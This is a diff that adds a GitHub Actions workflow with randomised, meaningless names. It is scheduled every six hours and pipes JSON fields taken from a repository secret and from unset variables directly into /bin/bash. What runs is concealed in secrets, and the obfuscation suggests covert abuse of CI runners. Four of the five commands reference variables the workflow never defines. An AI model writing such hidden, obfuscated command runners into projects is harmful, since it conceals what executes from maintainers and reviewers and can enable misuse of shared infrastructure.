@@ -1,0 +1,23 @@
+name: meiyangguo2008
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: meiyangguo2008
+        env:
+          tutc8411: ${{ secrets.tutc8411 }}
+        run: |
+          echo $tutc8411 | jq -r .olsq7 | /bin/bash
+          echo $b96548 | jq -r .ghtog05453 | /bin/bash
+          echo $n32563 | jq -r .qoly68771 | /bin/bash
+          echo $p1 | jq -r .gryu41424 | /bin/bash
+          echo $hyrhs7559 | jq -r .ina976 | /bin/bash
+
